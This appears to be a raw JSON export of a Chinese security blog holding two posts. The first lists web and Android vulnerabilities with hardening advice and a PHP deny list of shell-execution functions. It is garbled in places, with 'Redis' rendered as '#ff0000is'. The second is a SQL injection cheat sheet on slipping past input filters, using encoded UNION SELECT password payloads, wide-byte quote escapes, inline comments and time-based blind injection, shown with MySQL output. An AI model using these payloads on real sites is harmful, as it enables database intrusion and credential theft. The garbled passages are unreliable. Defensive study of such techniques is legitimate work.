此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。 加固建议： 建议将Microsoft .NET Framework 更新至最新版本。\n.git信息泄露 风险级别：高危 漏洞描述： 泄露网站敏感信息，攻击者可直接获取源码信息实施进一步攻击。 加固建议： 删除.git目录。\n错误页面信息泄露（应用程序错误信息） 风险级别：中危 漏洞描述： 攻击者可以根据错误或警告消息收集服务器信息。 加固建议： 1.关闭web服务器错误提示； 2.关闭运行平台的错误提示； 3.建立错误机制，不要把真实的错误反馈给访问者。捕获后台抛出的异常，制定异常固定跳转页面，如500错误，跳转到相应页面，例如“系统异常请与管理员联系”，403异常，找不到页面等等。\n备份文件泄露 风险级别：中危 漏洞描述： 在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 加固建议： 1.删除不必要的备份文件； 2.设置访问权限； 3.将备份文件放至服务器其它目录下。\n目录遍历 风险级别：中危 漏洞描述： 攻击者通过不指定url中的具体文件，来查看某个目录下的所有文件和目录结构。 加固建议： 针对目录遍历漏洞，建议通过修改配置文件，去除Web 容器（如Apache）的文件目录索引功能。\nIIS短文件名漏洞 风险级别：中危 漏洞描述： Microsoft IIS在实现上存在文件枚举漏洞，攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。 加固建议： 针对IIS短文件名漏洞，建议禁止url中使用“~”或它的Unicode编码，或关闭windows的8.3格式功能。\n源代码泄露漏洞 风险级别：中危 漏洞描述： 部分或全部页面源代码泄露，攻击者可审查源代码泄露的可用信息进一步渗透。 加固建议： 删除源代码文件或对需要的未解析的源代码进行解析。\nrobots.txt文件泄露 风险级别：中危 漏洞描述： 泄露网站敏感信息，包括网站的后台页面或其它隐私页面。 加固建议： 1.robots.txt 文件不应用来保护或隐藏信息。 2.应该将敏感的文件和目录移到另一个隔离的子目录，以便将这个目录排除在 Web Robot 搜索之外。如下列示例所示，将文件移到“folder”之类的非特定目录名称是比较好的解决方案： New directory structure: /folder/passwords.txt /folder/sensitive_folder/ New robots.txt: User-agent: * Disallow: /folder/ 3.如果您无法更改目录结构，且必须将特定目录排除于 Web Robot 之外，在 robots.txt 文件中，请只用局部名称。虽然这不是最好的解决方案，但至少它能加大完整目录名称的猜测难度。例如，如果要排除“sensitive_folder”和 “passwords.txt”，请使用下列名称（假设 Web 根目录中没有起始于相同字符的文件或目录）： robots.txt: User-agent: * Disallow: /se Disallow: /pa。\n敏感信息泄露 风险级别：中危 漏洞描述： 敏感信息泄露一般包括：中间件、软件框架（cms）类型和版本信息，数据库表结构、网站架构、账号密码体系等等。这些信息一般在服务器错误信息、html注释、隐藏表单、示例文件等地方出现。攻击者得到这些信息，有助于缩小攻击范围，进行有针对性的更深层次的攻击。 加固建议： 对于一般信息泄露，删除无用页面，或删除页面中的敏感信息即可。对于敏感报错信息泄露，需要设置代码捕获异常，并抛出异常，服务端出现异常后不在客户端回显，统一返回不包含敏感信息的错误页面。\nGithub信息泄露漏洞 风险级别：中危 漏洞描述： 开发人员使用Github进行代码管理。而免费用户在Github上的项目内容可在网站中检索到，并对所有用户开放可查看。泄露的敏感信息一般包括：软件源代码、程序账号密码等等。攻击者得到这些信息，可以进行代码审计，更有针对性的找到网站漏洞，甚至可以获得用户账号密码，直接登录获得用户权限。 加固建议： 删除敏感的Github项目代码，对可能泄露的帐号密码及时进行修改。\nPHP探针信息泄露 风险级别：中危 漏洞描述： PHP探针文件会导致网站敏感信息泄露 加固建议： 删除默认安装PHP探针文件。\nphpinfo页面泄露 风险级别：中危 漏洞描述： 泄露网站服务器敏感信息，包括网站物理路径、PHP版本、服务器信息及环境变量等。 加固建议： 1.通过修改服务器环境内php.ini文件，将“expose_php = On”修改成“expose_php = Off”然后重启php即可。 2.如果确实需要该测试信息，在测试时使用，测试完毕后将该文件删除掉。 3.若无需要可以将一些php的危险函数禁用，打开/etc/php.ini文件，查找到 disable_functions，添加需禁用的以下函数名：phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen\n发现隐藏目录 风险级别：低危 漏洞描述： 尝试了检测服务器上的隐藏目录，403 Forbidden 响应泄露了存在此目录，即使不允许对其进行访问，泄露网站目录结构。 加固建议： 可对禁止的资源发布“404 - Not Found”响应状态代码，或者将其完全除去。\n内部IP地址泄露 风险级别：低危 漏洞描述： 泄露内网IP地址 加固建议： 禁止将内网IP置于网站页面或代码层中。\nOpenSSH CBC模式信息泄露漏洞 风险级别：低危 漏洞描述： 配置为CBC模式，OpenSSH没有正确地处理分组密码算法加密的SSH会话中所出现的错误，导致可能泄露密文中任意块最多32位纯文本。 加固建议： 临时解决方案：在SSH会话中仅使用CTR模式加密算法，如AES-CTR 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接： https://downloads.ssh.com/\n未加密的登录请求 风险级别：低危 漏洞描述： 检测中发现登录请求（例如：用户名、密码、电子邮件地址、社会安全号码等）被发送到服务器的过程中并未采用通讯加密协议或加密。恶意人员可通过数据截包实现网站管理员用户名、密码信息的截获。 加固建议： 注册或登录时，客户发送请求敏感信息进行加密，例如密码、电话、邮件等敏感信息进行加密传输。\nMemcached 未授权访问漏洞 风险级别：高危 漏洞描述： 由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。 加固建议： 1.配置memcached监听本地回环地址127.0.0.1。 2.当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。\nrsync未授权访问漏洞 风险级别：高危 漏洞描述： rsync是类unix系统下的数据镜像备份工具，如果配置不当，可导致攻击者匿名访问rsync程序，进一步进行增删改等操作。 加固建议： 建议两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。\nWebSphere绕过安全限制漏洞 风险级别：高危 漏洞描述： 在Java端\u0026rdquo;%c0%ae\u0026quot;解析为\u0026rdquo;\\uC0AE\u0026quot;，最后转义为ASCCII低字符\u0026quot;.\u0026quot;。通过这个方法可以绕过目录保护读取包配置文件信息，包括web-inf和meta-inf目录下的内容。攻击者还可以利用此漏洞查看或执行war包里面的文件。此漏洞影响WebSphere Application Server 版本5.1, 6.0, 6.1 和7.0。 加固建议： 升级WebSphere至最新版，或安装PK81387安全补丁。 http://www-01.ibm.com/support/docview.wss?uid=swg24022456\ncisco vpn未授权访问 风险级别：高危 漏洞描述： Cisco Adaptive Security Appliance (ASA) Software在Clientless SSL VPN入口自定义框架在实现上存在安全漏洞，未经身份验证的远程攻击者可利用此漏洞修改Clientless SSL VPN入口内容，导致窃取凭证、跨站脚本及其他攻击。此漏洞源于没有正确实现Clientless SSL VPN入口自定义框架内的身份验证检查。 加固建议： 建议升级思科最新发布的补丁： http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa\nDNS域传送漏洞 风险级别：高危 漏洞描述： DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库，一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息。 加固建议： 针对域传送漏洞，建议通过定义ACL(访问控制列表)来限制在域名服务器之间的区域传送，通常可编辑/etc/named.conf中allow-transfer参数。存在漏洞的是ns1.com, 如果其他ns2、ns3、ns4是备用dns服务器，那么应该只允许域传送至其他对应的地址。配置如下： allow-transfer { localhost; ns2的IP; ns3的IP; ns4的IP;};\nMongodb数据库未授权访问漏洞 风险级别：高危 漏洞描述： Mongodb在启动的时候未设置 –auth参数，造成恶意攻击者可使用默认空口令登陆到数据服务器。 加固建议： 建议增加数据库用户校验或限制设备登录IP地址，限制未授权访问。\n#ff0000is数据库未授权访问漏洞 风险级别：高危 漏洞描述： #ff0000is 默认情况下会绑定在 0.0.0.0:6379，这样将会将 #ff0000is 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 #ff0000is 以及读取 #ff0000is 的数据。攻击者在未授权访问 #ff0000is 的情况下可以利用 #ff0000is的相关方法，可以成功在 #ff0000is 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。 加固建议： 1.配置bind选项，限定可以连接#ff0000is服务器的IP，修改 #ff0000is 的默认端口6379 2.配置认证，也就是AUTH，设置密码，密码会以明文方式保存在#ff0000is配置文件中 3.配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度 4.好消息是#ff0000is作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config等。\nphpmyadmin未授权访问 风险级别：中危 漏洞描述： 发现phpmyadmin路径，且没有密码保护，可直接登录数据库，获得数据库root权限。 加固建议： 设置数据库密码防止未授权访问，修改phpmyadmin默认路径防止被攻击者发现。\n.htaccess文件未授权访问 风险级别：中危 漏洞描述： 攻击者可未授权访问.htaccess文件，泄露网站敏感信息。 加固建议： 禁止.htaccess文件被查看\n弱口令漏洞 风险级别：高危 漏洞描述： 包括但不限于：网站登录/FTP/SSH/数据库/中间件等，攻击者可猜解用户登录口令登录系统，实施进一步渗透攻击。 加固建议： 针对弱口令漏洞，建议用户及时修改密码，加强口令强度，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。\nSNMP默认团体名漏洞 风险级别：高危 漏洞描述： 由于很多操作系统或者网络设备的SNMP代理服务存在可读默认口令。如果这些默认口令没有修改或者为弱口令，远程攻击者就可以通过SNMP代理获取系统的很多细节信息。如果攻击者得到了可写口令，它甚至可以修改系统文件或者执行系统命令。 加固建议： 针对SNMP信息泄露漏洞，建议修改SNMP缺省口令或者关闭SNMP服务。\nFTP开启匿名登录 风险级别：高危 漏洞描述： 攻击者可利用弱口令或匿名登录漏洞直接登录 FTP 服务，上传恶意文件，从而获取系统权限，并可能造成数据泄露。 加固建议： FTP服务为明文传输，建议使用SFTP代替，如需要继续休使用建议，禁止匿名登录，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。\n会话劫持漏洞 风险级别：中危 漏洞描述： 攻击者通过暴力破解、预测或者窃取（网络嗅探/XSS攻击）等方式获取用户Session ID后，使用该Session ID登录目标账号的攻击方法。 加固建议： 1.更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。 2.关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。 3.设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。 4.关闭所有phpinfo类dump request信息的页面。 5.使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。\n会话固定漏洞 风险级别：中危 漏洞描述： 会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。 加固建议： 1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。 2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。\n会话cookie中缺少HttpOnly属性 风险级别：低危 漏洞描述： 如不设置此属性，攻击者可配合跨站脚本盗取cookie。设置此属性，即使有跨站漏洞存在，也很难利用。 加固建议： 在服务器端设置cookie的HttpOnly属性为真。\n未禁用密码表单自动完成属性 风险级别：低危 漏洞描述： 自动填写未对密码字段禁用的 HTML 属性。 加固建议： 将“autocomplete”属性正确设置为“off”。\n会话cookie中缺少secure属性 风险级别：低危 漏洞描述： 可能会窃取在加密的会话期间发送的用户和会话信息。 加固建议： 服务器开启了Https时，cookie的Secure属性应设为true\n未授权访问 风险级别：高危 漏洞描述： 后台页面或者其他用户页面没有做session认证，导致可以无需登录，直接访问页面。 加固建议： 对未授权访问页面做session认证，严格审核后台功能页面的访问权限，若为未登录用户则拒绝访问。\n越权漏洞 风险级别：高危 漏洞描述： 水平越权：攻击者能够执行与自己同级别权限用户的操作 垂直越权：攻击者能够执行高级别权限用户的操作，比如管理员的相关操作。 加固建议： 1.设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行； 2.默认情况下，应该拒绝执行所有访问权限，也就是说缺省不给用户任何权限，防止攻击者利用缺省权限执行攻击等； 3.对于每个功能的访问，都要有明确的角色授权，防止黑客利用不完善的访问控制缺陷造成不必要的损失； 或者是实现Web访问的IP白名单列表，或者是只允许属于管理员范围权利的指定IP访问等等。\n任意用户密码重置漏洞 风险级别：高危 漏洞描述： 系统在处理重置密码请求时使用本地验证方法，未在服务端处理，造成用户可在本地修改数据包，绕过系统身份验证，达到重置任意账号的目的。 加固建议： 针对任意用户密码重置漏洞，建议在服务器端加强逻辑验证。\n验证码漏洞 风险级别：高危 漏洞描述： 验证码可以一次多用，导致可以暴力破解； 验证码没有限定次数和时间，导致可以无限制的发送验证码。 加固建议： 设置验证码登录一次，变换一次，防止暴力破解；设置验证码120秒只发送一次。\n暴力破解漏洞（登录页面密码猜测攻击） 风险级别：中危 漏洞描述： 登录入口没有验证码或者验证码可以一次多用，导致可以暴力破解。攻击者可能试图尝试每个可能的字母，数字和符号组合，或使用一些暴力破解工具进行猜测，直到它发现了一个正确的组合，从而进入登录页面做进一步深度非法攻击。 加固建议： 1.增加验证码，使之登录失败一次，验证码变换一次。 2.针对密码猜测，建议控制错误登录次数，以防止暴力破解。同一用户如果5分钟内登录失败6次，禁用此用户登录30分钟。\n用户名猜解漏洞 风险级别：中危 漏洞描述： 通过登录信息可以判断有无此用户，可以对用户名进行猜解。 加固建议： 使用模糊的错误登录提示，如：用户名或密码错误。\n短信轰炸漏洞 风险级别：中危 漏洞描述： 短信轰炸是由于系统设计缺陷可无限制发送短信验证码给客户端，攻击者可利用该漏洞对任意手机号码进行短信轰炸，对公司造成不良影响和运行安全风险。 加固建议： 建议针对发送短信验证码接口加强权限控制，在服务端限制单位时间内发送短信次数。\nWebview远程代码执行漏洞 风险级别：高危 漏洞描述： WebView组件中的addJavascriptInterface方法用于实现本地Java和JavaScript的交互，但是该函数并没有对方法调用进行限制，导致攻击者可以调用任何JAVA类，最终导致JavaScript代码对设备进行任意攻击 加固建议： 建议不使用addJavascriptInterface接口，对于Android API Level为17或者以上的Android系统，Google规定允许被调用的函数，必须在Java的远程方法上面声明一个@JavascriptInterface注解；在使用js2java的bridge时候，需要对每个传入的参数进行验证，避免恶意代码的攻击。\n代码动态加载安全检测 风险级别：高危 漏洞描述： 使用DexClassLoader或PathClassLoader动态加载dex文件、apk文件、jar文件时，如果这些文件存储在可被其他应用读写的目录中(比如sdcard)，同时没有对外部加载的文件进行完整性校验，导致应用可能会被恶意代码注入并执行。 加固建议： 将所需要动态加载的文件放置在apk内部，或应用私有目录中；如果应用必须要把所加载的文件放置在可被其他应用读写的目录中(比如sdcard)，建议对不可信的加载源进行完整性校验和白名单处理，以保证不被恶意代码注入\n应用签名未校验风险 风险级别：高危 漏洞描述： 应用签名未校验，攻击者可伪造app程序。 加固建议： 增加程序本地签名校验及云端的签名校验\n篡改和二次打包风险 风险级别：高危 漏洞描述： 对移动应用进行破解、再篡改或插入恶意代码，最后重新打包生成一个新应用的过程，恶意程序通过插入广告、木马、病毒的方式窃取用户隐私、吸资扣费、耗费流量等。 加固建议： 增加程序本地签名校验及云端的签名校验。\nJava代码反编译风险 风险级别：中危 漏洞描述： 可通过反编译工具获取java源代码，攻击者可获取源码信息执行更深入的渗透攻击。 加固建议： 1.隔离Java程序； 2.对Class文件进行加密； 3.代码混淆。\n资源文件泄露风险 风险级别：中危 漏洞描述： 泄露的js文件如果被读取，可能会造成功能逻辑泄露，如果被篡改，可能被植入钓鱼页面或恶意代码，造成用户的敏感信息泄露 加固建议： 对资源文件(.js)进行加密保护，防止资源文件泄露。\nWebview明文存储密码风险 风险级别：中危 漏洞描述： 在使用WebView的过程中忽略了WebView setSavePassword，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到应用数据目录的databases/webview.db中。如果手机被root就可以获取明文保存的密码，造成用户的个人敏感数据泄露。 加固建议： 使用WebView.getSettings().setSavePassword(false)来禁止保存密码\n明文数字证书风险 风险级别：中危 漏洞描述： 明文存储的数字证书如果被篡改，可能会造成客户端与服务端之间的传输数据被截获并解密，造成用户信息泄露 加固建议： 对数字证书文件(.cer)进行加密，避免证书文件泄露\n应用数据任意备份风险 风险级别：中危 漏洞描述： Android 2.1 以上的系统可为App提供应用程序数据的备份和恢复功能，该由AndroidMainfest.xml文件中的allowBackup 属性值控制，其默认值为true。当该属性没有显式设置为false时,攻击者可通过adb backup 和adb restore对App的应用数据进行备份和恢复,从而可能获取明文存储的用户敏感信息，如用户的密码、证件号、手机号、交易密码、身份令牌、服务器通信记录等。利用此类信息攻击者可伪造用户身份，盗取用户账户资产，或者直接对服务器发起攻击。 加固建议： 关闭应用程序数据的备份和恢复功能。\nAES/DES加密方法不安全使用漏洞 风险级别：中危 漏洞描述： 使用AES/DES/DESede加密算法时，如果使用ECB模式，容易受到攻击风险，造成信息泄露 加固建议： 使用AES/DES/DESede加密算法时，应显示指定使用CBC或CFB加密模式\n敏感函数调用风险 风险级别：中危 漏洞描述： APP应用程序中调用了包含敏感行为的函数，包括发送短信、发送地理位置、拨打电话等，可能会导致用户隐私数据泄露等风险 加固建议： 开发者审核包含敏感行为的函数调用，确保其使用是必要且限制于授权用户的\nHTTP传输数据风险 风险级别：中危 漏洞描述： 攻击者在自己设置的钓鱼网络中配置DNS服务器，将软件要连接的服务器域名解析至攻击者的另一台服务器在，这台服务器就可以获得用户登录信息，或者充当客户端与原服务器的中间人，转发双方数据。 加固建议： 对敏感数据采用基于SSL/TLS的HTTPS进行传输。\nHTTPS未校验服务器证书漏洞 风险级别：中危 漏洞描述： 虽然使用了https通信方式，但是只是简单的调用而已，并未对SSL证书有效性做验证，攻击者以轻易获取手机用户的明文通信信息。 加固建议： 对SSL证书进行有效性做验证\nActivity组件导出风险 风险级别：中危 漏洞描述： 导出的Activity组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到绕过认证、恶意代码注入等攻击风险。 加固建议： 如果应用的Activity组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。\nService组件导出风险 风险级别：中危 漏洞描述： 导出的Service组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限提升、拒绝服务等攻击风险。 加固建议： 如果应用的Service组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。\nBroadcast Receiver组件导出风险 风险级别：中危 漏洞描述： 导出的Broadcast Receiver组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险 加固建议： 如果应用的Broadcast Receiver组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要接收外部应用发送的消息，建议对组件进行权限控制。\n系统组件本地拒绝服务检测 风险级别：中危 漏洞描述： 导出的组件在处理Intent附加数据的时候，没有进行异常捕获，攻击者可通过向应用发送空数据、异常或畸形数据等，导致应用程序崩溃。 加固建议： 不必要导出的组件，建议显示设置组件的“android:exported”属性为false；在使用Intent获取附加数据时，使用try catch进行异常捕获和处理，防止抛出异常引发崩溃。\nContent Provider组件导出风险 风险级别：中危 漏洞描述： 导出的Content Provider组件可以被第三方app任意调用，导致敏感信息泄露，并可能受到目录遍历、SQL注入等攻击风险 加固建议： 如果应用的Content Provider组件不必要导出，建议显式设置组件的“android:exported”属性为false；如果必须要有数据提供给外部应用使用，建议对组件进行权限控制。\n","date":"2018-06-29T14:08:48Z","image":"https://w.wallhaven.cc/full/5g/wallhaven-5g3zw1.png","permalink":"https://360rce.github.io/p/cn9uzd7k/","title":"web漏洞合集描述和修复建议"},{"content":"into绕过order by 过滤 order by 和 into两个都可以用来判断列数，但是两者是有区别的 order by 是你select了几个就可以在那几个的范围里面变动，超过就报错。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 mysql\u0026gt; select username,password from users order by 1; +----------+------------+ | username | password | +----------+------------+ | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | admin4 | admin4 | | Angelina | I-kill-you | | batman | mob!le | | dhakkan | dumbo | | Dumb | Dumb | | Dummy | p@ssword | | hello | world | | secure | crappy | | stupid | stupidity | | superman | genious | +----------+------------+ 14 rows in set (0.01 sec) mysql\u0026gt; select username,password from users order by 2; +----------+------------+ | username | password | +----------+------------+ | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | admin4 | admin4 | | secure | crappy | | Dumb | Dumb | | dhakkan | dumbo | | superman | genious | | Angelina | I-kill-you | | batman | mob!le | | Dummy | p@ssword | | stupid | stupidity | | hello | world | +----------+------------+ 14 rows in set (0.00 sec) mysql\u0026gt; select username,password from users order by 3; ERROR 1054 (42S22): Unknown column \u0026#39;3\u0026#39; in \u0026#39;order clause\u0026#39; into 就比较死板，必须是你select 了几个就要into 几个，少了多了都不行。而且必须是一行才可以所以必须要limit.（1.select into 本是一个备份内容的操作。2.@是一个变量符号）\n1 2 3 4 5 6 mysql\u0026gt; select username,password from users into @; ERROR 1222 (21000): The used SELECT statements have a different number of columns mysql\u0026gt; select username,password from users into @,@; ERROR 3061 (42000): User variable name \u0026#39;\u0026#39; is illegal mysql\u0026gt; select username,password from users into @,@,@; ERROR 1222 (21000): The used SELECT statements have a different number of columns order by 只能在 limit前使用,into 只能在limit 之后使用\n1 2 3 4 5 6 7 8 9 mysql\u0026gt; select * from users limit 1,1 order by 3; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;order by 3\u0026#39; at line 1 mysql\u0026gt; select * from users order by 3 limit 1,1; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 9 | admin1 | admin1 | +----+----------+----------+ 1 row in set (0.00 sec) 1 2 3 4 mysql\u0026gt; select * from users limit 1,1 into @,@,@; ERROR 3061 (42000): User variable name \u0026#39;\u0026#39; is illegal mysql\u0026gt; select * from users into @,@,@ limit 1,1; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;limit 1,1\u0026#39; at line 1 小结：order by 过滤了用into\n16进制绕过引号 有些时候过滤了引号，导致字符串不能写入，我们可以用字符串的16进制形式绕过，这样就不需要引号了。还有hex()和unhex()这两个函数可以使用。\n1 2 select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; select column_name from information_schema.tables where table_name=0x7573657273 等于号过滤使用like 或者 in 绕过 等号过滤用in或like 代替\n1 2 3 4 5 6 7 8 9 10 substr(password,1,1) in(\u0026#39;p\u0026#39;); substr(password,1,1) like(\u0026#39;p\u0026#39;); mysql\u0026gt; select * from users where username in(\u0026#39;admin\u0026#39;); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | +----+----------+----------+ 1 row in set (0.00 sec) in 还能通过order by 指定顺序\n1 select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7); \u0026lt;，\u0026gt; 代替等于号构造真值 1 2 3 or swords \u0026gt; sw or swords \u0026lt; tw or 1\u0026lt;3 字符串相等绕过 1 or \u0026#39;swords\u0026#39; = \u0026#39;swords\u0026#39; sleep过滤 BENCHMARK(count,expr)\nBENCHMARK()函数重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用。\n1 if(ascii(substring((database()),1,1))\u0026gt;1,(select benchmark(10000000,md5(0x41))),1) 编码绕过 URLEncode编码，ASCII，HEX，unicode编码绕过\nURL编码：or 1=1即%6f%72%20%31%3d%31\nurl双重编码; ?id=1%252f%252a\\*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a\\*/FROM%252f%252a\\*/Users--+\nhex编码：见16进制绕过单引号\nascii编码: select * from users where username=char(97,100,109,105,110)\n或者\nchar(101)+char(97)+char(105)+char(116)\nunicode编码：\n一些unicode编码举例：\n1 2 3 4 单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9 html 实体编码：SELECT FROM Users WHERE username = 'admin'\nsubstr()的逗号绕过 from 1 for 1 代替 substr(,1,1)\n1 2 select * from users where id=1 union select 1,2, substr((select username from users limit 0,1),1,1); select * from users where id=1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 mysql\u0026gt; select * from users where id=1 union select 1,2, substr((select username from users limit 0,1),1,1); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | | 1 | 2 | D | +----+----------+----------+ 2 rows in set (0.01 sec) mysql\u0026gt; select * from users where id=1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1); +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | | 1 | 2 | D | +----+----------+----------+ 2 rows in set (0.00 sec) limit 逗号绕过 limit 1 offset 0 代替 limit 0,1\n1 select * from users where id=1 union select 1,2, substr((select username from users limit 1 offset 0),1,1); 其他逗号绕过（使用join) 1 2 select * from users union select 1,2,3; select * from users union select * from (select 1)a join (select 2)b join (select 3)c; greatest between 绕过\u0026lt;,\u0026gt; 等比较符号 当我们盲注的时候，要用到比较符号，如果过滤了可以用greatest(x,y,z,..)绕过 返回的是他们的最大值\n1 select * from users where id=1 and ascii(substr(database(),0,1))\u0026gt;64 改成\n1 select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 当然这里的等于号可以改成in()\n1 SELECT * FROM `p_archives_3` WHERE `picsad` between 1113 and 1122 等同于\n1 SELECT * FROM `p_archives_3` WHERE `picsad` \u0026gt;= 1113 and `picsad`\u0026lt;=1122 你要保证picsad是数字类型的\n空格绕过 ()\n括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格 select(user())from dual where(1=1)and(2=2) ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23\n/**/或者/*1*/\n%0d %0a %0c %0b %a0\n+\nTAB\n两个括号\n把上面说的编一下码试试\nselect Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格\nselect A,1E0fromB\n这里的逗号是两列的意思 1e0占了第二列\n同样，上面的1E0可以用1.0代替\n\\N 绕过是绕过NULL,因为\\N相当于NULL\n1 select * from pass where id=\\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),\u0026#39;v\u0026#39;)in(\u0026#39;v\u0026#39;); id 与from在之间的空格绕过\n1 2 select+id-1+1.from users; select-id-1+3.from users; 注意：第二句得到的id将会是 -id+2\n常见的注释 –+\n%23\n– -\n%00\n`单行或者多行注释（别名）\n/* */ 单行或者多行注释\n利用过滤删除绕过 比如说他过滤了/**/（将其删除）又过滤了select那么我们可以这么写 sel/**/ect.\n意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法\n大小写绕过 经常试试大小写混合比如 UnIOn sELecT….\n内联注释绕过 介绍一下什么是内联注释：/!/在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性.\n1 2 3 id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- - /*!50001from*/ 表示在mysql版本高于50001也就是mysql5中可以执行这条命令 + - . 拆分字符串绕过 1 2 ?id=1\u0026#39; or \u0026#39;11+11\u0026#39;=\u0026#39;11+11\u0026#39; \u0026#34;-\u0026#34;和\u0026#34;.\u0026#34; 符号代替文字绕过 \u0026amp;\u0026amp;代替and\n||代替or\n| 代替 xor\n宽字节绕过 简单的讲一下，一般当引号被过滤就会在引号前加一个\\，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，\\的url是%27我们在引号前写上%df，那么%df%27构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是%df只要在那个字符集的范围内都可以。如%bf%27 %df%27 %aa%27\n等价函数变量的绕过 hex()、bin() ==\u0026gt; ascii()\nsleep() ==\u0026gt;benchmark()\n这里补充一下:\n1 2 在sqlsever 中用 waitfor delay 在Oracle 中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句 